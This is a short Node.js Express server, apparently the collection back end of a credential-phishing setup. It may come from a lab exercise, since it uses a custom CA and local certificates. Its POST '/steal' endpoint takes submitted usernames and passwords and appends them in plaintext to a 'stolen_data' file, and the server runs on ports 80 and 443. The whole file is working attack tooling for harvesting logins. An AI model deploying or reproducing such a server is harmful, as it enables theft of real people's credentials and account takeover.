process.env.NODE_EXTRA_CA_CERTS = '../../certs/CAcert.crt';

const bodyParser = require('body-parser');
const express = require('express');
const https = require('https');
const http = require('http');

const fs = require('fs');

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use('/', express.static('static'));

app.post('/steal', (req, res) => {
	if (req.body.username && req.body.password) {
		fs.appendFileSync('stolen_data/data', `username: ${req.body.username}, password: ${req.body.password}\n`);
		res.send(true);
	} else {
		res.send(false);
	}
});

const credentials = {
	key: fs.readFileSync('../../certs/privkeyA.pem', 'utf8'),
	cert: fs.readFileSync('../../certs/certA.crt', 'utf8')
};

const httpServer = http.createServer(app);
const httpsServer = https.createServer(credentials, app);

httpServer.listen(80, () => {
	console.log('http started');
});
httpsServer.listen(443, () => {
	console.log('https started');
});
